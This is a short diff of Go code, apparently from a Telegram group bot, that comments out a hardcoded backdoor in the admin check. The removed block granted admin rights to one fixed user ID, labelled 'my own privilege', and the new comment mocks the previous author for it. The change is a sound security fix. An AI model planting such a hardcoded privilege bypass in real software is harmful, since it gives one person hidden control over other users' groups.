@@ -13,9 +13,10 @@ import (
 func checkAdmin(gid int64, user tgbotapi.User) bool {
 	admins, _ := bot.GetChatAdministrators(tgbotapi.ChatConfig{gid, ""})
 	uid := user.ID
-	if uid == 731400898 { //我自己的特权
+	//哼, 上一任作者的小九九
+	/*if uid == 731400898 { //我自己的特权
 		return true
-	}
+	}*/
 	for _, user := range admins {
 		if uid == user.User.ID {
 			return true
